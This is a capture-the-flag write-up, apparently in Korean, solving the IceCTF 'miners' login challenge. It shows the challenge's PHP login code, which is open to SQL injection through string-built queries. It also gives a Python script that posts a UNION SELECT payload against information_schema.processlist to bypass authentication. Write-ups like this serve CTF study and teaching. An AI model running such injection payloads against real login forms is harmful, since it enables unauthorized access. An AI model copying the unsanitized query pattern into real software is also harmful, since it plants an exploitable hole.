============================================================================================================
[IceCTF] Solve
============================================================================================================

|

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5;
        }
        step0 -> step1[label="post_data: {username=' union select 1,2,info from information_schema.processlist-- -",arrowhead="normal"];
        step3 -> step2[label="login success",arrowhead="normal"];
    }

|

취약점 존재 여부 확인
================================================================================================================

- POST 로그인 페이지 취약점
- POST 파라미터: username, password
- MySQL, Union Select Injection
- information_schema

.. code-block:: php

    <?php
    include "config.php";
    $con = mysqli_connect($MYSQL_HOST, $MYSQL_USER, $MYSQL_PASS, $MYSQL_DB);
    $username = $_POST["username"];
    $password = $_POST["password"];
    $query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
    $result = mysqli_query($con, $query);

    if (mysqli_num_rows($result) !== 1) {
      echo "<h1>Login failed.</h1>";
    } else {
      echo "<h1>Logged in!</h1>";
      echo "<p>Your flag is: $FLAG</p>";
    }

    ?>

|

login success
================================================================================================================


.. code-block:: python

    import requests

    requests.packages.urllib3.disable_warnings()

    url = "http://miners.vuln.icec.tf/login.php"

    payload = {
        "username": "' union select 1,2,info from information_schema.processlist-- -",
        "password": "1",
    }

    r = requests.post(url, data=payload, verify=False)

    print r.content

|